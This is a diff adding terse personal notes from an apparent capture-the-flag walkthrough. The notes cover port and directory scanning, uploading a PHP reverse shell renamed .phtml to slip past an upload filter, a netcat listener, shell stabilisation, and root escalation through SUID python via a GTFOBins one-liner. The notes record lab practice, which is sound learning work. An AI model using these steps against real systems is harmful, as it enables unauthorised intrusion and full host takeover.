@@ -1,0 +1,76 @@
+nmap
+
+2 ports
+
+Apache 2.4.41
+
+Service 22
+
+ssh
+
+gobuster
+
+panel
+uploads ----- hidden directories
+
+going into reverse shell
+
+not likes .php
+
+changed ip to kali machine
+port to 4444
+
+and file extension to phtml
+
+phpshell.phtml
+
+
+upload it
+
+nc -lnvp 4444
+
+/uploads
+
+run phpshell.phtml
+
+succesfull. need to stable the shell 
+
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+
+who ami
+
+www-data
+
+try cd var/www
+
+user.txt
+
+got flag
+
+
+privilege escalation
+
+find / type f -- (file) -perm (PERMISSIONS) -4000 (corresponding to SUID)
+
+
+/usr/bin/python accessible without root permissions
+
+GTFOBins 
+
+python 
+
+SUID
+
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+whoami
+
+root
+
+cd /root
+
+root.txt
+
+flag
+
